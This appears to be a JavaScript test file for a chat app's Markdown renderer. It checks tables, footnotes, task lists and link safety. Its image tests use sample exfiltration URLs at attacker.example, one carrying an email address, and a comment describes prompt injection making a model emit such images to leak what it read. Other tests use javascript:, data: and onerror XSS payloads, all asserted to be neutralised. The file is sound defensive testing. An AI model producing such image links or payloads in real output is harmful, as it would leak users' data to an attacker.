const test = require("node:test");
const assert = require("node:assert/strict");
const { createElement } = require("react");
const { renderToStaticMarkup } = require("react-dom/server");
const { createRendererServer, installBrowserGlobals } = require("../lib/rendererTestHarness");

// Chat answers routinely come back as GFM tables. react-markdown follows
// CommonMark, which has no table syntax, so without remark-gfm the whole table
// collapsed into one paragraph of literal pipes.
const TABLE_MARKDOWN = [
  "| Theme | Note | Meaning |",
  "|:------|:----:|--------:|",
  "| **Activation** | 63 | Week-one drop-off |",
  "| Accuracy | 65 | Four distinct causes |",
  "",
].join("\n");

async function renderMarkdown(t, content) {
  installBrowserGlobals(t);
  const vite = await createRendererServer(t, {
    cachePrefix: "openwhispr-markdown-renderer-test-",
  });
  const mod = await vite.ssrLoadModule("/components/ui/MarkdownRenderer.tsx");
  if (Array.isArray(content)) {
    return renderToStaticMarkup(
      createElement(
        "div",
        null,
        ...content.map((message) => createElement(mod.default, { content: message }))
      )
    );
  }
  return renderToStaticMarkup(createElement(mod.default, { content }));
}

test("footnote references and backlinks reach accessible in-document destinations", async (t) => {
  const html = await renderMarkdown(t, "Claim.[^source] Again.[^source]\n\n[^source]: Evidence.");
  const ids = new Set([...html.matchAll(/\bid="([^"]+)"/g)].map((match) => match[1]));
  const links = [...html.matchAll(/<a\b[^>]*href="#[^"]+"[^>]*>/g)].map((match) => match[0]);

  assert.equal(links.length, 4, "two references and their return links");
  for (const link of links) {
    const destination = link.match(/href="#([^"]+)"/)[1];
    assert.ok(ids.has(destination), `destination ${destination} exists`);
    assert.ok(!link.includes('target="_blank"'), "footnotes stay in the document");
  }
  const label = html.match(/<h2\b[^>]*id="([^"]+)"[^>]*class="[^"]*sr-only[^>]*>/);
  assert.ok(label, "the footnote heading keeps its accessible ID and hidden styling");
  assert.ok(html.includes(`aria-describedby="${label[1]}"`));
  assert.ok(html.includes("data-footnote-ref"));
  assert.ok(html.includes("data-footnote-backref"));
  assert.ok(html.includes('aria-label="Back to reference'));
});

test("separate messages with the same footnote label have distinct destinations", async (t) => {
  const content = "Claim.[^source]\n\n[^source]: Evidence.";
  const html = await renderMarkdown(t, [content, content]);
  const ids = [...html.matchAll(/\bid="([^"]+)"/g)].map((match) => match[1]);

  assert.equal(ids.length, 6, "each message has a reference, definition and heading ID");
  assert.equal(new Set(ids).size, ids.length, "messages never share a destination ID");
});

test("external links still open separately with safe relationship attributes", async (t) => {
  const html = await renderMarkdown(t, "[Website](https://openwhispr.com)");
  assert.ok(html.includes('href="https://openwhispr.com"'));
  assert.ok(html.includes('target="_blank"'));
  assert.ok(html.includes('rel="noopener noreferrer"'));
});

test("a GFM table renders as a real table, not literal pipes", async (t) => {
  const html = await renderMarkdown(t, TABLE_MARKDOWN);

  assert.ok(html.includes("<table"), "renders a table element");
  assert.ok(html.includes("<th"), "renders header cells");
  assert.ok(
    /<th[^>]*text-start/.test(html),
    "header cells align to the writing direction, not a physical edge"
  );
  assert.equal((html.match(/<tr/g) || []).length, 3, "one header row plus two body rows");
  assert.ok(!html.includes("|"), "no literal pipe survives into the output");
});

test("column alignment from the separator row is preserved", async (t) => {
  const html = await renderMarkdown(t, TABLE_MARKDOWN);

  assert.ok(html.includes("text-align:left"), "left-aligned column");
  assert.ok(html.includes("text-align:center"), "centre-aligned column");
  assert.ok(html.includes("text-align:right"), "right-aligned column");
});

test("a wide table scrolls instead of stretching its container", async (t) => {
  const html = await renderMarkdown(t, TABLE_MARKDOWN);

  assert.ok(html.includes("overflow-x-auto"), "table sits in a scrollable wrapper");
});

test("Markdown component types stay stable across streaming and parent rerenders", async (t) => {
  installBrowserGlobals(t);
  const vite = await createRendererServer(t, {
    cachePrefix: "openwhispr-markdown-reconciliation-test-",
  });
  const { MarkdownRenderer } = await vite.ssrLoadModule("/components/ui/MarkdownRenderer.tsx");
  let components;
  function InspectMarkdown(props) {
    const element = MarkdownRenderer(props);
    components = element.props.children.props.children.props.components;
    return element;
  }
  renderToStaticMarkup(createElement(InspectMarkdown, { content: TABLE_MARKDOWN }));
  const initial = components;

  for (const props of [
    { content: TABLE_MARKDOWN },
    { content: `${TABLE_MARKDOWN}\nMore streamed text.` },
    { content: TABLE_MARKDOWN, className: "text-sm" },
  ]) {
    renderToStaticMarkup(createElement(InspectMarkdown, props));
    const updated = components;
    // A changed ancestor type also remounts nested tables and loses their scroll position.
    for (const tag of Object.keys(initial)) {
      assert.equal(updated[tag], initial[tag], `${tag} must reconcile instead of remounting`);
    }
  }
});

test("inline markdown inside cells still renders", async (t) => {
  const html = await renderMarkdown(t, TABLE_MARKDOWN);

  assert.ok(html.includes("<strong"), "bold inside a cell is parsed");
});

test("non-table markdown is unchanged", async (t) => {
  const html = await renderMarkdown(t, "## Heading\n\n- one\n- two\n\n**bold** and `code`\n");

  assert.ok(html.includes("<h2"), "headings still render");
  assert.ok(html.includes("<ul"), "lists still render");
  assert.ok(html.includes("<strong"), "bold still renders");
  assert.ok(html.includes("<code"), "inline code still renders");
  assert.ok(!html.includes("prose"), "no typography-plugin classes: the plugin is not installed");
});

test("GFM extras the plugin enables render as elements, not literal syntax", async (t) => {
  const html = await renderMarkdown(
    t,
    "~~gone~~ and https://openwhispr.com\n\n- [ ] open\n- [x] done\n"
  );

  assert.ok(html.includes("<del"), "strikethrough renders as del");
  assert.ok(!html.includes("~~"), "no literal tildes survive");
  assert.ok(html.includes('href="https://openwhispr.com"'), "a bare URL is autolinked");
  assert.equal(
    (html.match(/type="checkbox"/g) || []).length,
    2,
    "task list renders two checkboxes"
  );
});

// A prompt injection in a note, calendar event or web result can make the model
// end its reply with an image whose URL carries what it read. An <img> fetches
// that URL the moment the reply renders, with no click.
test("a Markdown image never renders an <img>; it becomes a link the user can click", async (t) => {
  const html = await renderMarkdown(
    t,
    [
      "![](https://attacker.example/p.png?d=alice%40corp.com)",
      "![Quarterly chart](https://attacker.example/chart.png)",
      "![   ](https://attacker.example/blank.png)",
      '![titled](https://attacker.example/titled.png "Chart title")',
      "![upper](HTTPS://attacker.example/upper.png)",
      "![plain](http://attacker.example/plain.png)",
      "![reference][pixel]",
      "[![badge](https://attacker.example/badge.svg)](https://github.com/openwhispr)",
      "[![](https://attacker.example/blank-badge.svg)](https://github.com/openwhispr/blank)",
      "",
      "[pixel]: https://attacker.example/ref.png",
      "",
    ].join("\n")
  );

  assert.ok(!html.includes("<img"), "no image element is produced");
  const attributesWithUrl = [...html.matchAll(/([\w-]+)="[^"]*attacker\.example[^"]*"/g)].map(
    ([, name]) => name
  );
  assert.ok(attributesWithUrl.length > 0);
  assert.ok(
    attributesWithUrl.every((name) => name === "href"),
    `the image URL only appears as a link target, got: ${attributesWithUrl.join(", ")}`
  );
  const links = [...html.matchAll(/<a\b([^>]*)>([^<]*)<\/a>/g)].map(([, attrs, label]) => ({
    href: attrs.match(/href="([^"]*)"/)?.[1],
    attrs,
    label,
  }));
  assert.deepEqual(
    links.map(({ href, label }) => [href, label]),
    [
      [
        "https://attacker.example/p.png?d=alice%40corp.com",
        "https://attacker.example/p.png?d=alice%40corp.com",
      ],
      ["https://attacker.example/chart.png", "Quarterly chart"],
      ["https://attacker.example/blank.png", "https://attacker.example/blank.png"],
      ["https://attacker.example/titled.png", "titled"],
      ["HTTPS://attacker.example/upper.png", "upper"],
      ["http://attacker.example/plain.png", "plain"],
      ["https://attacker.example/ref.png", "reference"],
      // A nested link would take the click, so the surrounding link keeps it.
      ["https://github.com/openwhispr", "badge"],
      // The image URL would read as the destination of a link that goes elsewhere.
      ["https://github.com/openwhispr/blank", ""],
    ],
    "each image is a link labelled with its alt text, or its URL when the alt text is blank"
  );
  assert.ok(
    links.find(({ label }) => label === "titled").attrs.includes('title="Chart title"'),
    "the image title carries over"
  );
  for (const { attrs } of links) {
    assert.ok(attrs.includes('target="_blank"'), "opens like other Markdown links");
    assert.ok(attrs.includes('rel="noopener noreferrer"'));
  }
});

test("an image without an absolute web URL keeps only its alt text", async (t) => {
  const html = await renderMarkdown(
    t,
    [
      "![inline chart](data:image/png;base64,iVBORw0KGgo=)",
      "![](javascript:alert(1))",
      "![share](//attacker.example/unc.png?next=https://attacker.example/)",
      "![drive](/C:/Windows/System32/cmd.exe)",
      "![anchor](#section)",
      "![](//attacker.example/blank-share.png)",
      "![](/C:/Windows/System32/blank.exe)",
      "",
    ].join("\n")
  );

  assert.ok(!html.includes("<img"), "no image element is produced");
  assert.ok(!html.includes("<a"), "nothing to link to");
  for (const alt of ["inline chart", "share", "drive", "anchor"]) {
    assert.ok(html.includes(alt), `the alt text "${alt}" still reads`);
  }
  assert.ok(!html.includes("data:"), "the data: URL is not echoed");
  assert.ok(!html.includes("javascript:"), "the javascript: URL is not echoed");
  assert.ok(!html.includes("attacker.example"), "the relative URL is not echoed");
  assert.ok(!html.includes("System32"), "the drive path is not echoed");
});

test("URL sanitisation is unchanged with the plugin enabled", async (t) => {
  const html = await renderMarkdown(
    t,
    "[click](javascript:alert(1)) [data](data:text/html,hi) <img src=x onerror=alert(1)>\n"
  );

  assert.ok(!html.includes("javascript:"), "javascript: href is stripped");
  assert.ok(!html.includes("data:text"), "data: href is stripped");
  assert.ok(!html.includes("<img"), "raw HTML stays escaped");
});

// A GFM table row is a single line, so models break lines inside a cell with
// <br>. Raw HTML stays escaped, which printed those tags as literal text.
test("<br> inside a table cell becomes a line break, not literal text", async (t) => {
  const html = await renderMarkdown(
    t,
    [
      "| Call | Topics |",
      "|------|--------|",
      "| One | • first<br>• second<br/>• third<BR />• fourth |",
      "",
    ].join("\n")
  );

  assert.ok(!html.includes("&lt;br"), "no literal <br> text in the cell");
  assert.equal((html.match(/<br\/?>/g) || []).length, 3, "each tag is a real line break");
  assert.ok(html.includes("fourth"), "text after the breaks still renders");
});

test("other raw HTML stays escaped next to a converted <br>", async (t) => {
  const html = await renderMarkdown(t, "line one<br>line two <b>bold</b> <br onclick=x>\n");

  assert.equal((html.match(/<br\/?>/g) || []).length, 1, "only the plain <br> converts");
  assert.ok(html.includes("&lt;b&gt;"), "<b> is still escaped");
  assert.ok(html.includes("&lt;br onclick=x&gt;"), "a <br> with attributes is still escaped");
  assert.ok(!html.includes("onclick=x>"), "no attribute reaches the DOM");
});

test("<br> in inline code stays literal", async (t) => {
  const html = await renderMarkdown(t, "Use `<br>` for a break.\n");

  assert.ok(html.includes("&lt;br&gt;"), "code shows the tag as written");
  assert.ok(!/<br\/?>/.test(html), "no line break is inserted");
});
